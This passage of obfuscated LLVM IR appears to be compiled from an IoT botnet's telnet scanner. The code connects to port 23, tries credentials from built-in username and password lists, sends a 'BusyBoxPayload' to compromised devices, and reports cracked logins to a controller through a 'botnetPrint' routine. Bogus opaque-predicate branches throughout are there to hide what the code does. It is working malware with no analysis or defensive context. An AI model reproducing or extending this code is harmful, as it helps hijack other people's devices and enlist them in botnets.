  %1021 = load i32, i32* %5, align 4
  %1022 = sext i32 %1021 to i64
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1022
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1023, i32 0, i32 7
  %1025 = load i32, i32* %1024, align 16
  %1026 = add i32 %1025, 7
  %1027 = zext i32 %1026 to i64
  %1028 = call i64 @time(i64* null) #3
  %1029 = icmp slt i64 %1027, %1028
  br i1 %1029, label %1030, label %1050

; <label>:1030:                                   ; preds = %1020
  %1031 = load i32, i32* @x.71
  %1032 = load i32, i32* @y.72
  %1033 = sub i32 %1031, 1
  %1034 = mul i32 %1031, %1033
  %1035 = urem i32 %1034, 2
  %1036 = icmp eq i32 %1035, 0
  %1037 = icmp slt i32 %1032, 10
  %1038 = or i1 %1036, %1037
  br i1 %1038, label %originalBB135, label %originalBB135alteredBB

originalBB135:                                    ; preds = %originalBB135alteredBB, %1030
  %1039 = load i32, i32* %5, align 4
  %1040 = sext i32 %1039 to i64
  %1041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1040
  call void @reset_telstate(%struct.telstate_t* %1041)
  %1042 = load i32, i32* @x.71
  %1043 = load i32, i32* @y.72
  %1044 = sub i32 %1042, 1
  %1045 = mul i32 %1042, %1044
  %1046 = urem i32 %1045, 2
  %1047 = icmp eq i32 %1046, 0
  %1048 = icmp slt i32 %1043, 10
  %1049 = or i1 %1047, %1048
  br i1 %1049, label %originalBBpart2137, label %originalBB135alteredBB

originalBBpart2137:                               ; preds = %originalBB135
  br label %1050

; <label>:1050:                                   ; preds = %originalBBpart2137, %1020
  br label %1162

; <label>:1051:                                   ; preds = %175
  %1052 = call i64 @time(i64* null) #3
  %1053 = trunc i64 %1052 to i32
  %1054 = load i32, i32* %5, align 4
  %1055 = sext i32 %1054 to i64
  %1056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1055
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1056, i32 0, i32 7
  store i32 %1053, i32* %1057, align 16
  %1058 = load i32, i32* %5, align 4
  %1059 = sext i32 %1058 to i64
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1059
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1060, i32 0, i32 0
  %1062 = load i32, i32* %1061, align 16
  %1063 = call i64 @send(i32 %1062, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.102, i32 0, i32 0), i64 4, i32 16384)
  %1064 = icmp slt i64 %1063, 0
  br i1 %1064, label %1065, label %1066

; <label>:1065:                                   ; preds = %1051
  br label %1066

; <label>:1066:                                   ; preds = %1065, %1051
  %1067 = load i32, i32* @x.71
  %1068 = load i32, i32* @y.72
  %1069 = sub i32 %1067, 1
  %1070 = mul i32 %1067, %1069
  %1071 = urem i32 %1070, 2
  %1072 = icmp eq i32 %1071, 0
  %1073 = icmp slt i32 %1068, 10
  %1074 = or i1 %1072, %1073
  br i1 %1074, label %originalBB139, label %originalBB139alteredBB

originalBB139:                                    ; preds = %originalBB139alteredBB, %1066
  %1075 = load i32, i32* %5, align 4
  %1076 = sext i32 %1075 to i64
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 0
  %1079 = load i32, i32* %1078, align 16
  %1080 = call i64 @send(i32 %1079, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.103, i32 0, i32 0), i64 7, i32 16384)
  %1081 = icmp slt i64 %1080, 0
  %1082 = load i32, i32* @x.71
  %1083 = load i32, i32* @y.72
  %1084 = sub i32 %1082, 1
  %1085 = mul i32 %1082, %1084
  %1086 = urem i32 %1085, 2
  %1087 = icmp eq i32 %1086, 0
  %1088 = icmp slt i32 %1083, 10
  %1089 = or i1 %1087, %1088
  br i1 %1089, label %originalBBpart2141, label %originalBB139alteredBB

originalBBpart2141:                               ; preds = %originalBB139
  br i1 %1081, label %1090, label %1091

; <label>:1090:                                   ; preds = %originalBBpart2141
  br label %1091

; <label>:1091:                                   ; preds = %1090, %originalBBpart2141
  %1092 = load i32, i32* %5, align 4
  %1093 = sext i32 %1092 to i64
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1093
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1094, i32 0, i32 0
  %1096 = load i32, i32* %1095, align 16
  %1097 = load i8*, i8** @BusyBoxPayload, align 8
  %1098 = load i8*, i8** @BusyBoxPayload, align 8
  %1099 = call i64 @strlen(i8* %1098) #9
  %1100 = call i64 @send(i32 %1096, i8* %1097, i64 %1099, i32 16384)
  %1101 = icmp slt i64 %1100, 0
  br i1 %1101, label %1102, label %1122

; <label>:1102:                                   ; preds = %1091
  %1103 = load i32, i32* @x.71
  %1104 = load i32, i32* @y.72
  %1105 = sub i32 %1103, 1
  %1106 = mul i32 %1103, %1105
  %1107 = urem i32 %1106, 2
  %1108 = icmp eq i32 %1107, 0
  %1109 = icmp slt i32 %1104, 10
  %1110 = or i1 %1108, %1109
  br i1 %1110, label %originalBB143, label %originalBB143alteredBB

originalBB143:                                    ; preds = %originalBB143alteredBB, %1102
  %1111 = load i32, i32* %5, align 4
  %1112 = sext i32 %1111 to i64
  %1113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1112
  call void @reset_telstate(%struct.telstate_t* %1113)
  %1114 = load i32, i32* @x.71
  %1115 = load i32, i32* @y.72
  %1116 = sub i32 %1114, 1
  %1117 = mul i32 %1114, %1116
  %1118 = urem i32 %1117, 2
  %1119 = icmp eq i32 %1118, 0
  %1120 = icmp slt i32 %1115, 10
  %1121 = or i1 %1119, %1120
  br i1 %1121, label %originalBBpart2145, label %originalBB143alteredBB

originalBBpart2145:                               ; preds = %originalBB143
  br label %1179

; <label>:1122:                                   ; preds = %1091
  %1123 = load i32, i32* %5, align 4
  %1124 = sext i32 %1123 to i64
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1124
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1125, i32 0, i32 7
  %1127 = load i32, i32* %1126, align 16
  %1128 = add i32 %1127, 25
  %1129 = zext i32 %1128 to i64
  %1130 = call i64 @time(i64* null) #3
  %1131 = icmp slt i64 %1129, %1130
  br i1 %1131, label %1132, label %1145

; <label>:1132:                                   ; preds = %1122
  %1133 = load i32, i32* %5, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1134
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1135, i32 0, i32 3
  %1137 = load i8, i8* %1136, align 1
  %1138 = zext i8 %1137 to i32
  %1139 = icmp ne i32 %1138, 3
  br i1 %1139, label %1140, label %1141

; <label>:1140:                                   ; preds = %1132
  br label %1141

; <label>:1141:                                   ; preds = %1140, %1132
  %1142 = load i32, i32* %5, align 4
  %1143 = sext i32 %1142 to i64
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1143
  call void @reset_telstate(%struct.telstate_t* %1144)
  br label %1145

; <label>:1145:                                   ; preds = %1141, %1122
  %1146 = load i32, i32* @x.71
  %1147 = load i32, i32* @y.72
  %1148 = sub i32 %1146, 1
  %1149 = mul i32 %1146, %1148
  %1150 = urem i32 %1149, 2
  %1151 = icmp eq i32 %1150, 0
  %1152 = icmp slt i32 %1147, 10
  %1153 = or i1 %1151, %1152
  br i1 %1153, label %originalBB147, label %originalBB147alteredBB

originalBB147:                                    ; preds = %originalBB147alteredBB, %1145
  %1154 = load i32, i32* @x.71
  %1155 = load i32, i32* @y.72
  %1156 = sub i32 %1154, 1
  %1157 = mul i32 %1154, %1156
  %1158 = urem i32 %1157, 2
  %1159 = icmp eq i32 %1158, 0
  %1160 = icmp slt i32 %1155, 10
  %1161 = or i1 %1159, %1160
  br i1 %1161, label %originalBBpart2149, label %originalBB147alteredBB

originalBBpart2149:                               ; preds = %originalBB147
  br label %1162

; <label>:1162:                                   ; preds = %originalBBpart2149, %1050, %originalBBpart2109, %761, %680, %originalBBpart293, %528, %397, %175
  %1163 = load i32, i32* @x.71
  %1164 = load i32, i32* @y.72
  %1165 = sub i32 %1163, 1
  %1166 = mul i32 %1163, %1165
  %1167 = urem i32 %1166, 2
  %1168 = icmp eq i32 %1167, 0
  %1169 = icmp slt i32 %1164, 10
  %1170 = or i1 %1168, %1169
  br i1 %1170, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %1162
  %1171 = load i32, i32* @x.71
  %1172 = load i32, i32* @y.72
  %1173 = sub i32 %1171, 1
  %1174 = mul i32 %1171, %1173
  %1175 = urem i32 %1174, 2
  %1176 = icmp eq i32 %1175, 0
  %1177 = icmp slt i32 %1172, 10
  %1178 = or i1 %1176, %1177
  br i1 %1178, label %originalBBpart2153, label %originalBB151alteredBB

originalBBpart2153:                               ; preds = %originalBB151
  br label %1179

; <label>:1179:                                   ; preds = %originalBBpart2153, %originalBBpart2145, %1019, %815, %originalBBpart2105, %746, %676, %664, %607, %493, %originalBBpart273, %330, %267, %originalBBpart240
  %1180 = load i32, i32* %5, align 4
  %1181 = add nsw i32 %1180, 1
  store i32 %1181, i32* %5, align 4
  br label %141

; <label>:1182:                                   ; preds = %141
  %1183 = load i32, i32* @x.71
  %1184 = load i32, i32* @y.72
  %1185 = sub i32 %1183, 1
  %1186 = mul i32 %1183, %1185
  %1187 = urem i32 %1186, 2
  %1188 = icmp eq i32 %1187, 0
  %1189 = icmp slt i32 %1184, 10
  %1190 = or i1 %1188, %1189
  br i1 %1190, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %1182
  %1191 = load i32, i32* @x.71
  %1192 = load i32, i32* @y.72
  %1193 = sub i32 %1191, 1
  %1194 = mul i32 %1191, %1193
  %1195 = urem i32 %1194, 2
  %1196 = icmp eq i32 %1195, 0
  %1197 = icmp slt i32 %1192, 10
  %1198 = or i1 %1196, %1197
  br i1 %1198, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br label %123
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  %1200 = load i32, i32* %5, align 4
  %1201 = load i32, i32* %11, align 4
  %1202 = icmp slt i32 %1200, %1201
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  %1203 = load i32, i32* %5, align 4
  %_ = sub i32 0, %1203
  %gen = add i32 %_, 1
  %_2 = sub i32 0, %1203
  %gen3 = add i32 %_2, 1
  %_4 = sub i32 0, %1203
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 0, %1203
  %gen7 = add i32 %_6, 1
  %_8 = shl i32 %1203, 1
  %_9 = shl i32 %1203, 1
  %_10 = sub i32 %1203, 1
  %gen11 = mul i32 %_10, 1
  %1204 = add nsw i32 %1203, 1
  store i32 %1204, i32* %5, align 4
  br label %originalBB1

originalBB15alteredBB:                            ; preds = %originalBB15, %98
  %1205 = load i32, i32* %7, align 4
  %_16 = shl i32 %1205, 1
  %_17 = sub i32 %1205, 1
  %gen18 = mul i32 %_17, 1
  %_19 = shl i32 %1205, 1
  %_20 = sub i32 %1205, 1
  %gen21 = mul i32 %_20, 1
  %_22 = shl i32 %1205, 1
  %_23 = shl i32 %1205, 1
  %_24 = shl i32 %1205, 1
  %_25 = sub i32 0, %1205
  %gen26 = add i32 %_25, 1
  %1206 = add nsw i32 %1205, 1
  store i32 %1206, i32* %7, align 4
  %1207 = sext i32 %1206 to i64
  %1208 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %1207
  %1209 = load i8*, i8** %1208, align 8
  %1210 = icmp ne i8* %1209, null
  br label %originalBB15

originalBB30alteredBB:                            ; preds = %originalBB30, %124
  store i32 0, i32* %5, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %145
  %1211 = load i32, i32* %5, align 4
  %1212 = sext i32 %1211 to i64
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1212
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1213, i32 0, i32 7
  %1215 = load i32, i32* %1214, align 16
  %1216 = icmp eq i32 %1215, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %238
  %1217 = load i32, i32* %5, align 4
  %1218 = sext i32 %1217 to i64
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1218
  %1220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1219, i32 0, i32 3
  store i8 1, i8* %1220, align 1
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %272
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %290
  %1221 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %1221, align 4
  %1222 = call zeroext i16 @htons(i16 zeroext 23) #10
  %1223 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %1222, i16* %1223, align 2
  %1224 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %1225 = getelementptr inbounds [8 x i8], [8 x i8]* %1224, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1225, i8 0, i64 8, i32 4, i1 false)
  %1226 = load i32, i32* %5, align 4
  %1227 = sext i32 %1226 to i64
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1227
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1228, i32 0, i32 1
  %1230 = load i32, i32* %1229, align 4
  %1231 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %1232 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1231, i32 0, i32 0
  store i32 %1230, i32* %1232, align 4
  %1233 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %1234 = load i32, i32* %5, align 4
  %1235 = sext i32 %1234 to i64
  %1236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1235
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1236, i32 0, i32 0
  store i32 %1233, i32* %1237, align 16
  %1238 = load i32, i32* %5, align 4
  %1239 = sext i32 %1238 to i64
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1239
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1240, i32 0, i32 0
  %1242 = load i32, i32* %1241, align 16
  %1243 = icmp eq i32 %1242, -1
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %331
  %1244 = load i32, i32* %5, align 4
  %1245 = sext i32 %1244 to i64
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1245
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1246, i32 0, i32 0
  %1248 = load i32, i32* %1247, align 16
  %1249 = load i32, i32* %5, align 4
  %1250 = sext i32 %1249 to i64
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1250
  %1252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1251, i32 0, i32 0
  %1253 = load i32, i32* %1252, align 16
  %1254 = call i32 (i32, i32, ...) @fcntl(i32 %1253, i32 3, i8* null)
  %_51 = shl i32 %1254, 2048
  %_52 = sub i32 0, %1254
  %gen53 = add i32 %_52, 2048
  %_54 = shl i32 %1254, 2048
  %_55 = sub i32 0, %1254
  %gen56 = add i32 %_55, 2048
  %_57 = sub i32 %1254, 2048
  %gen58 = mul i32 %_57, 2048
  %_59 = sub i32 %1254, 2048
  %gen60 = mul i32 %_59, 2048
  %_61 = sub i32 %1254, 2048
  %gen62 = mul i32 %_61, 2048
  %_63 = shl i32 %1254, 2048
  %1255 = or i32 %1254, 2048
  %1256 = call i32 (i32, i32, ...) @fcntl(i32 %1248, i32 4, i32 %1255)
  %1257 = load i32, i32* %5, align 4
  %1258 = sext i32 %1257 to i64
  %1259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1258
  %1260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1259, i32 0, i32 0
  %1261 = load i32, i32* %1260, align 16
  %1262 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %1263 = call i32 @connect(i32 %1261, %struct.sockaddr* %1262, i32 16)
  %1264 = icmp eq i32 %1263, -1
  br label %originalBB50

originalBB67alteredBB:                            ; preds = %originalBB67, %373
  %1265 = load i32, i32* %5, align 4
  %1266 = sext i32 %1265 to i64
  %1267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1266
  call void @reset_telstate(%struct.telstate_t* %1267)
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %473
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %508
  %1268 = load i32, i32* %5, align 4
  %1269 = sext i32 %1268 to i64
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1269
  call void @reset_telstate(%struct.telstate_t* %1270)
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %543
  %1271 = load i32, i32* %5, align 4
  %1272 = sext i32 %1271 to i64
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1272
  %1274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1273, i32 0, i32 9
  %1275 = load i8*, i8** %1274, align 8
  %1276 = call i32 @contains_fail(i8* %1275)
  %1277 = icmp ne i32 %1276, 0
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %567
  %1278 = load i32, i32* %5, align 4
  %1279 = sext i32 %1278 to i64
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1279
  call void @advance_state(%struct.telstate_t* %1280, i32 0)
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %587
  %1281 = load i32, i32* %5, align 4
  %1282 = sext i32 %1281 to i64
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1282
  call void @advance_state(%struct.telstate_t* %1283, i32 3)
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %622
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %684
  %1284 = load i32, i32* %5, align 4
  %1285 = sext i32 %1284 to i64
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1285
  %1287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1286, i32 0, i32 0
  %1288 = load i32, i32* %1287, align 16
  %1289 = load i32, i32* %3, align 4
  %1290 = load i32, i32* %5, align 4
  %1291 = sext i32 %1290 to i64
  %1292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1291
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1292, i32 0, i32 9
  %1294 = load i8*, i8** %1293, align 8
  %1295 = call i32 @read_until_response(i32 %1288, i32 %1289, i8* %1294, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %1296 = icmp ne i32 %1295, 0
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %722
  %1297 = load i32, i32* %5, align 4
  %1298 = sext i32 %1297 to i64
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1298
  call void @advance_state(%struct.telstate_t* %1299, i32 0)
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %787
  %1300 = load i32, i32* %5, align 4
  %1301 = sext i32 %1300 to i64
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1301
  call void @reset_telstate(%struct.telstate_t* %1302)
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %819
  %1303 = load i32, i32* %5, align 4
  %1304 = sext i32 %1303 to i64
  %1305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1304
  call void @advance_state(%struct.telstate_t* %1305, i32 6)
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %839
  %1306 = load i32, i32* %5, align 4
  %1307 = sext i32 %1306 to i64
  %1308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1307
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1308, i32 0, i32 0
  %1310 = load i32, i32* %1309, align 16
  %1311 = load i32, i32* %3, align 4
  %1312 = load i32, i32* %5, align 4
  %1313 = sext i32 %1312 to i64
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1313
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1314, i32 0, i32 9
  %1316 = load i8*, i8** %1315, align 8
  %1317 = call i32 @read_until_response(i32 %1310, i32 %1311, i8* %1316, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %1318 = icmp ne i32 %1317, 0
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %869
  %1319 = call i64 @time(i64* null) #3
  %1320 = trunc i64 %1319 to i32
  %1321 = load i32, i32* %5, align 4
  %1322 = sext i32 %1321 to i64
  %1323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1322
  %1324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1323, i32 0, i32 7
  store i32 %1320, i32* %1324, align 16
  %1325 = load i32, i32* %5, align 4
  %1326 = sext i32 %1325 to i64
  %1327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1326
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1327, i32 0, i32 9
  %1329 = load i8*, i8** %1328, align 8
  %1330 = call i32 @contains_fail(i8* %1329)
  %1331 = icmp ne i32 %1330, 0
  br label %originalBB115

originalBB119alteredBB:                           ; preds = %originalBB119, %899
  %1332 = load i32, i32* %5, align 4
  %1333 = sext i32 %1332 to i64
  %1334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1333
  call void @advance_state(%struct.telstate_t* %1334, i32 0)
  br label %originalBB119

originalBB123alteredBB:                           ; preds = %originalBB123, %927
  %1335 = load i32, i32* %5, align 4
  %1336 = sext i32 %1335 to i64
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1336
  %1338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1337, i32 0, i32 3
  %1339 = load i8, i8* %1338, align 1
  %1340 = zext i8 %1339 to i32
  %1341 = icmp eq i32 %1340, 2
  br label %originalBB123

originalBB127alteredBB:                           ; preds = %originalBB127, %955
  %1342 = load i32, i32* @KadenCommStock, align 4
  %1343 = load i32, i32* %5, align 4
  %1344 = sext i32 %1343 to i64
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1344
  %1346 = call i8* @get_telstate_host(%struct.telstate_t* %1345)
  %1347 = load i32, i32* %5, align 4
  %1348 = sext i32 %1347 to i64
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1348
  %1350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1349, i32 0, i32 4
  %1351 = load i8, i8* %1350, align 2
  %1352 = zext i8 %1351 to i64
  %1353 = getelementptr inbounds [36 x i8*], [36 x i8*]* @usernames, i64 0, i64 %1352
  %1354 = load i8*, i8** %1353, align 8
  %1355 = load i32, i32* %5, align 4
  %1356 = sext i32 %1355 to i64
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1356
  %1358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1357, i32 0, i32 5
  %1359 = load i8, i8* %1358, align 1
  %1360 = zext i8 %1359 to i64
  %1361 = getelementptr inbounds [36 x i8*], [36 x i8*]* @passwords, i64 0, i64 %1360
  %1362 = load i8*, i8** %1361, align 8
  %1363 = call i32 (i32, i8*, ...) @botnetPrint(i32 %1342, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.101, i32 0, i32 0), i8* %1346, i8* %1354, i8* %1362)
  %1364 = load i32, i32* %5, align 4
  %1365 = sext i32 %1364 to i64
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1365
  call void @advance_state(%struct.telstate_t* %1366, i32 7)
  br label %originalBB127

originalBB131alteredBB:                           ; preds = %originalBB131, %1002
  br label %originalBB131

originalBB135alteredBB:                           ; preds = %originalBB135, %1030
  %1367 = load i32, i32* %5, align 4
  %1368 = sext i32 %1367 to i64
  %1369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1368
  call void @reset_telstate(%struct.telstate_t* %1369)
  br label %originalBB135

originalBB139alteredBB:                           ; preds = %originalBB139, %1066
  %1370 = load i32, i32* %5, align 4
  %1371 = sext i32 %1370 to i64
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1371
  %1373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1372, i32 0, i32 0
  %1374 = load i32, i32* %1373, align 16
  %1375 = call i64 @send(i32 %1374, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.103, i32 0, i32 0), i64 7, i32 16384)
  %1376 = icmp slt i64 %1375, 0
  br label %originalBB139

originalBB143alteredBB:                           ; preds = %originalBB143, %1102
  %1377 = load i32, i32* %5, align 4
  %1378 = sext i32 %1377 to i64
  %1379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1378
  call void @reset_telstate(%struct.telstate_t* %1379)
  br label %originalBB143

originalBB147alteredBB:                           ; preds = %originalBB147, %1145
  br label %originalBB147

originalBB151alteredBB:                           ; preds = %originalBB151, %1162
  br label %originalBB151

originalBB155alteredBB:                           ; preds = %originalBB155, %1182
  br label %originalBB155
}

; Function Attrs: nounwind
declare void @srand(i32) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %originalBBpart221, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %54

; <label>:10:                                     ; preds = %6
  %11 = load i32, i32* @x.73
  %12 = load i32, i32* @y.74
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = call i32 @rand_cmwc()
  %20 = urem i32 %19, 26
  %21 = add i32 %20, 65
  %22 = trunc i32 %21 to i8
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  store i8 %22, i8* %26, align 1
  %27 = load i32, i32* @x.73
  %28 = load i32, i32* @y.74
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* @x.73
  %37 = load i32, i32* @y.74
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %35
  %44 = load i32, i32* %5, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %5, align 4
  %46 = load i32, i32* @x.73
  %47 = load i32, i32* @y.74
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart221, label %originalBB6alteredBB

originalBBpart221:                                ; preds = %originalBB6
  br label %6

; <label>:54:                                     ; preds = %6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %55 = call i32 @rand_cmwc()
  %_ = sub i32 0, %55
  %gen = add i32 %_, 26
  %56 = urem i32 %55, 26
  %_1 = sub i32 %56, 65
  %gen2 = mul i32 %_1, 65
  %_3 = sub i32 %56, 65
  %gen4 = mul i32 %_3, 65
  %_5 = shl i32 %56, 65
  %57 = add i32 %56, 65
  %58 = trunc i32 %57 to i8
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  store i8 %58, i8* %62, align 1
  br label %originalBB

originalBB6alteredBB:                             ; preds = %originalBB6, %35
  %63 = load i32, i32* %5, align 4
